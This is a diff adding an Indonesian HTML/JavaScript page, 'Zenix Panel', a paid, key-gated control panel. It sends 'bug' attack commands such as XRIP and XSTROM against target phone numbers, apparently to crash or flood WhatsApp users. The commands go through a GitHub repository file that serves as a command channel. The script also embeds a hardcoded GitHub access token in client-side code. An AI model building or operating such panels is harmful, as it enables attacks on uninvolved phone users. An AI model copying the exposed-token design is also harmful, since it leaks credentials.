@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Zenix Panel - Rofik Official</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #0c1220;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+    #bgMediaContainer {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      z-index: -1;
+      overflow: hidden;
+    }
+    #bgMediaContainer video,
+    #bgMediaContainer img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+    .container, .bug-menu {
+      text-align: center;
+      background-color: rgba(16,24,47,0.85);
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.4);
+      max-width: 400px;
+      width: 90%;
+    }
+    input {
+      padding: 10px;
+      font-size: 16px;
+      border-radius: 5px;
+      border: none;
+      width: 90%;
+      margin-bottom: 15px;
+      text-align: center;
+    }
+    button {
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      background-color: #1c6ef2;
+      color: white;
+      cursor: pointer;
+      margin: 5px;
+      width: 45%;
+    }
+    button:hover {
+      background-color: #155ac1;
+    }
+    .btn-group {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+    .status {
+      font-size: 14px;
+      color: #00ffcc;
+      margin-top: 10px;
+    }
+    .footer {
+      position: absolute;
+      top: 10px;
+      left: 20px;
+      font-size: 12px;
+      color: #999;
+    }
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+
+<div id="bgMediaContainer"></div>
+<div class="footer">&copy; Rofik Official</div>
+<button onclick="gantiBG()" style="position:absolute;top:10px;right:10px;background:#00ffff;color:black;font-weight:bold;">🎞 Ganti Background</button>
+
+<!-- LOGIN -->
+<div class="container" id="loginBox">
+  <h2>Zenix Login</h2>
+  <input type="text" id="username" placeholder="Masukkan Username" />
+  <input type="text" id="key" placeholder="Masukkan Key" />
+  <button onclick="login()">Login</button>
+  <div class="status" id="loginStatus">Status Server: Reconnected</div>
+</div>
+
+<!-- MENU BUG -->
+<div class="bug-menu hidden" id="bugMenu">
+  <h2>Command Bug Zenix Core</h2>
+  <input type="number" id="targetNumber" placeholder="62xxx (Nomor Target)" inputmode="numeric" />
+  <div class="btn-group">
+    <button onclick="sendBug('/xrip')">XRIP</button>
+    <button onclick="sendBug('/xstrom')">XSTROM</button>
+    <button onclick="sendBug('/xui')">XUI</button>
+    <button onclick="sendBug('/xbul')">XBUL</button>
+    <button onclick="sendBug('/xhard')">XHARD</button>
+    <button onclick="sendBug('/xkros')">XKROS</button>
+  </div>
+  <button style="background:red;width:95%;" onclick="stopBug()">❌ STOP BUG</button>
+  <div class="status" id="statusPanel">Status Server: Connected</div>
+</div>
+
+<script>
+const GITHUB_TOKEN = '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';
+const GITHUB_REPO = 'GanzJbganteng/rofik';
+const BUG_FILE = 'bug.json';
+const API_BUG = `https://api.github.com/repos/${GITHUB_REPO}/contents/${BUG_FILE}`;
+const GITHUB_API_AUTH = 'https://api.github.com/repos/GanzJbganteng/webgw/contents/auth.json';
+
+const BACKGROUND_URL = localStorage.getItem('zenix-bg') || 'https://files.catbox.moe/496qux.mp4';
+function setBackgroundMedia(url) {
+  const ext = url.split('.').pop().toLowerCase();
+  const container = document.getElementById("bgMediaContainer");
+  container.innerHTML = (ext === 'mp4' || ext === 'webm')
+    ? `<video src="${url}" autoplay muted loop></video>`
+    : `<img src="${url}" alt="bg" />`;
+}
+function gantiBG() {
+  const url = prompt("Tempel URL video/gambar:");
+  if (!url) return;
+  localStorage.setItem("zenix-bg", url);
+  setBackgroundMedia(url);
+}
+setBackgroundMedia(BACKGROUND_URL);
+
+async function login() {
+  const username = document.getElementById("username").value.trim();
+  const key = document.getElementById("key").value.trim();
+  const loginStatus = document.getElementById("loginStatus");
+  loginStatus.textContent = "Mengecek akses KEY...";
+
+  try {
+    const res = await fetch(GITHUB_API_AUTH, {
+      headers: { Authorization: `Bearer ${GITHUB_TOKEN}` }
+    });
+    const file = await res.json();
+    const decoded = atob(file.content);
+    const data = JSON.parse(decoded);
+    const user = data.auth.find(u => u.username === username && u.key === key);
+
+    if (user) {
+      if (user.status === "banned") {
+        loginStatus.innerHTML = '🚫 KEY Anda telah di-banned.';
+      } else if (user.status === "trial") {
+        const expired = user.expires ? new Date(user.expires).getTime() : null;
+        if (expired && Date.now() > expired) {
+          loginStatus.textContent = "⛔ Masa trial telah habis.";
+        } else {
+          loginStatus.textContent = "✅ Login trial berhasil.";
+          document.getElementById("loginBox").classList.add("hidden");
+          document.getElementById("bugMenu").classList.remove("hidden");
+        }
+      } else if (user.status === "active") {
+        loginStatus.textContent = "✅ Login berhasil!";
+        document.getElementById("loginBox").classList.add("hidden");
+        document.getElementById("bugMenu").classList.remove("hidden");
+      } else {
+        loginStatus.textContent = `❌ KEY tidak aktif (${user.status})`;
+      }
+    } else {
+      loginStatus.innerHTML = '❌ Key salah atau tidak ditemukan. <a href="https://wa.me/6283169687238">WA</a> / <a href="https://t.me/rofikos">Telegram</a>';
+    }
+  } catch {
+    loginStatus.textContent = "❌ Gagal akses database KEY.";
+  }
+}
+
+async function getBugSHA() {
+  const res = await fetch(API_BUG, {
+    headers: { Authorization: `Bearer ${GITHUB_TOKEN}` }
+  });
+  const data = await res.json();
+  return data.sha;
+}
+
+async function sendBug(command) {
+  const target = document.getElementById("targetNumber").value.trim();
+  if (!/^62\d{7,15}$/.test(target)) return alert("❌ Nomor target tidak valid!");
+
+  const payload = { command, target, status: "new" };
+  try {
+    const sha = await getBugSHA();
+    await fetch(API_BUG, {
+      method: "PUT",
+      headers: {
+        Authorization: `Bearer ${GITHUB_TOKEN}`,
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        message: `bug ${command}`,
+        content: btoa(JSON.stringify(payload)),
+        sha
+      })
+    });
+    document.getElementById("statusPanel").innerText = `✅ ${command} dikirim ke ${target}`;
+  } catch {
+    alert("❌ Gagal kirim bug.");
+  }
+}
+
+async function stopBug() {
+  const payload = { command: "", target: "", status: "stop" };
+  try {
+    const sha = await getBugSHA();
+    await fetch(API_BUG, {
+      method: "PUT",
+      headers: {
+        Authorization: `Bearer ${GITHUB_TOKEN}`,
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        message: "Stop bug",
+        content: btoa(JSON.stringify(payload)),
+        sha
+      })
+    });
+    document.getElementById("statusPanel").innerText = "🛑 Bug dihentikan oleh user.";
+  } catch {
+    alert("❌ Gagal stop bug.");
+  }
+}
+</script>
+
+</body>
+</html>
